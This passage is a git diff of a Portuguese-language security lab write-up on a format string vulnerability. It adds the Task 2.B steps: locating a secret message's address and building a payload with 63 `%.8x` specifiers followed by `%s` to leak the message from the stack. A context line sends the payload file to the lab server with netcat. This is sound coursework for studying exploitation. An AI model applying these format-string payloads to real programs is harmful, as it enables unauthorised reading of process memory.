@@ -78,7 +78,7 @@ $ cat badfile | nc 10.9.0.5 9090
 
 - Após algumas tentativas, chegámos à conclusão de que foram necessários 64 especificadores de formato `%x` para acessar a localização da stack onde o valor estava alocado.
 
-```python
+```py
 unique_value = 0xdeadbeef
 content[0:4]  =  (unique_value).to_bytes(4,byteorder='little')
 
@@ -89,4 +89,21 @@ s = "%.8x"*64
 
 ### Task 2.B
 
+- Identificamoso endereço da "secret message": `0x080b4008`
+
+- Modificamos o nosso payload de modo a poder ler a mensagem secreta.
+
+```py
+number = 0x080b4008
+content[0:4]  =  (number).to_bytes(4,byteorder='little')
+
+s = "%.8x"*63 + "%s"
+```
+- A string formada pela expressão: `s = "%.8x"*63 + "%s"` salta 63 casas da stack e de seguida usa `%s` para interpretar o endereço da mensagem como um pointer para a string.
+
+![image](screenshots/LB6_2.png)
+
+## Task 3
+
+## Task 3.A
 
